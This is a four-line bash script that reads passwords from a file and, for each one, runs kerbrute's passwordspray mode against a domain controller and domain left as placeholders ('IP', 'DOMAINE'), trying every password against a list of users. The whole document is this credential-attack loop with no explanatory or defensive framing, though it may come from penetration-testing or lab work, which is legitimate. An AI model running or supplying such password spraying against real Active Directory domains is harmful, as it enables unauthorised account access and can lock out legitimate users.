#!/bin/bash
for password in $(cat passwords.txt); do
    ./kerbrute_linux_amd64 passwordspray --dc IP -d DOMAINE users.txt "$password"
done
